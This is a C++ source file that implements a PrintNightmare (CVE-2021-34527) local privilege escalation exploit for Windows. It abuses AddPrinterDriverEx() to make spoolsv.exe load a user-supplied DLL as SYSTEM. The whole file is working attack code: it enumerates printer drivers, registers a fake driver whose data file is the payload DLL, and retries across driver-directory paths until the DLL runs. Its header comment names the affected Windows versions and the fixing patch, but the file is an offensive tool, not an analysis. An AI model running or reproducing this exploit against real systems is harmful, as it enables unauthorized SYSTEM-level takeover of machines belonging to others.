/* CVE-2021-34527 AddPrinterDriverEx() Privilege Escalation
 * ========================================================
 * Implementation of PrintNightmare which can be used to get
 * SYSTEM privileges on impacted hosts. This issue can also
 * be exploited when Point & Print policy is weakened and 
 * does not perform UAC warning when installing print drivers
 * or restrict to Administrator accounts. This uses the Win32
 * API to call AddPrinterDriverEx() to run DLL in spoolsv.exe.
 *
 * Hosts with KB5004947 are not vulnerable to this issue. Hosts
 * that are joined to a domain may not be vulnerable via this 
 * exploit but could be via RPC or LRPC exploits instead.
 */
#include "CVE-2021-34527.h"
using namespace std;

void GenerateRandomString(char* pString, const int iLen)
{
	srand((unsigned int)time(0));
	for (int i = 0; i < iLen; ++i) {
		int iRandomChar = rand() % (26 + 26 + 10);
		if (iRandomChar < 26)
			pString[i] = 'a' + iRandomChar;
		else if (iRandomChar < 26 + 26)
			pString[i] = 'A' + iRandomChar - 26;
		else
			pString[i] = '0' + iRandomChar - 26 - 26;
	}
	pString[iLen - 1] = 0;
}

int main(int argc, char* argv[]) 
{
	int i;
	HRESULT hr;
	size_t sSize;
	char* cPrinterName;
	DRIVER_INFO_2 info;
	DRIVER_INFO_2* pDriverInfo2;
	DWORD dwSize, dwBytesNeeded, dwDrvRet, dwError;;
	LPWSTR pDLLpath, pFileName, pPrinterName;
	LPBYTE pDriverDirectory[MAX_PATH + 1] = { 0 };
	printf("[+] Windows AddPrinterDriverEx() LPE SYSTEM exploit (CVE-2021-34527)\n");
	printf("[-] For Windows Desktop 7,8,8.1,10,11 & Server 2008,2012,2016,2019\n");
	if (argc != 2) {
		printf("[!] Error, you must supply a path to a thread-safe DLL\n");
		return EXIT_FAILURE;
	}
	pDLLpath = new TCHAR[MAX_PATH + 1];
	mbstowcs_s(&sSize,pDLLpath,MAX_PATH, argv[1], MAX_PATH);
	GetPrinterDriverDirectory(NULL, NULL, 1, (LPBYTE)pDriverDirectory, MAX_PATH, &dwSize);
	wprintf(L"[+] Printer Driver Directory %s\n", (LPWSTR)pDriverDirectory);
	EnumPrinterDrivers((LPTSTR)NULL, (LPTSTR)NULL, 2, NULL, 0, &dwBytesNeeded, &dwDrvRet);
	pDriverInfo2 = (DRIVER_INFO_2*)LocalAlloc(LPTR, dwBytesNeeded);
	EnumPrinterDrivers(NULL, (LPTSTR)NULL, 2, (LPBYTE)pDriverInfo2, dwBytesNeeded, &dwBytesNeeded, &dwDrvRet);
	printf("[+] EnumPrinterDrivers %d bytes of printers\n", dwBytesNeeded);
	if (dwDrvRet && dwBytesNeeded)
	{
		srand((unsigned int)time(NULL));
		i = rand() % dwDrvRet;
		printf("[+] Using printer driver: %ls\n", (wchar_t*)(pDriverInfo2 + i)->pName);
		cPrinterName = (char*)malloc(MAX_PATH + 1);
		if (!cPrinterName) {
			printf("[!] Fatal malloc() error\n");
			return EXIT_FAILURE;
		}
		memset(cPrinterName, 0, MAX_PATH + 1);
		GenerateRandomString(cPrinterName, 10);
		pPrinterName = new TCHAR[MAX_PATH + 1];
		mbstowcs_s(&sSize, pPrinterName, MAX_PATH, cPrinterName, strlen(cPrinterName));
		info.cVersion = 3;
		info.pName = pPrinterName;
#ifdef _M_IX86
		info.pEnvironment = (LPWSTR)L"Windows x86";
#elif _M_X64
		info.pEnvironment = (LPWSTR)L"Windows x64";
#else
		info.pEnvironment = (LPWSTR)L"Windows";
#endif
		info.pDriverPath = (LPWSTR)(pDriverInfo2 + i)->pDriverPath;
		info.pDataFile = pDLLpath;
		info.pConfigFile = (LPWSTR)(pDriverInfo2 + i)->pConfigFile;
		printf("[-] Name: %ls\n", info.pName);
		printf("[-] Environment: %ls\n", info.pEnvironment);
		printf("[-] DriverPath: %ls\n", info.pDriverPath);
		printf("[-] DataFile: %ls\n", info.pDataFile);
		printf("[-] ConfigFile: %ls\n", info.pConfigFile);
		hr = AddPrinterDriverExW(NULL, 2, (BYTE*)&info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
		printf("[+] AddPrinterDriverExW() return = %d\n", hr);
		if (hr)
		{
			for (i = 0; i <= 100; i++)
			{
				pDLLpath = new TCHAR[MAX_PATH + 1];
				pFileName = new TCHAR[MAX_PATH + 1];
				_wsplitpath_s(info.pDataFile, NULL, 0, NULL, 0, (wchar_t*)pFileName, MAX_PATH + 1, NULL, 0);
				wsprintf(pDLLpath, L"%s\\3\\old\\%d\\%s.dll", (LPWSTR)pDriverDirectory, i, (LPWSTR)pFileName);
				info.pConfigFile = pDLLpath;
				wprintf(L"[-] Path = %s\n", pDLLpath);
				hr = AddPrinterDriverExW(NULL, 2, (BYTE*)&info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
				printf("[+] AddPrinterDriverExW() return = %d\n", hr);
				if (hr != 0)
				{
					printf("[*] Exploit success, DLL running as SYSTEM\n");
					hr = DeletePrinterDriver(NULL, info.pEnvironment, info.pName);
					printf("[-] Cleaning up DLL DeletePrinterDriver() = %d\n", hr);
					dwError = GetLastError();
					printf("[+] GetLastError() return %d\n", dwError);
					return EXIT_SUCCESS;
				}
				dwError = GetLastError();
				printf("[+] GetLastError() return %d\n", dwError);
				delete pDLLpath;
				delete pFileName;
			}

		}
		else {
			dwError = GetLastError();
			printf("[+] GetLastError() return %d\n", dwError);
		}
	}
	hr = DeletePrinterDriver(NULL, info.pEnvironment, info.pName);
	printf("[-] Cleaning up DLL DeletePrinterDriver() = %d\n", hr);
	dwError = GetLastError();
	printf("[+] GetLastError() return %d\n", dwError);
	printf("[!] Exploit has failed\n");
	return EXIT_FAILURE;
}
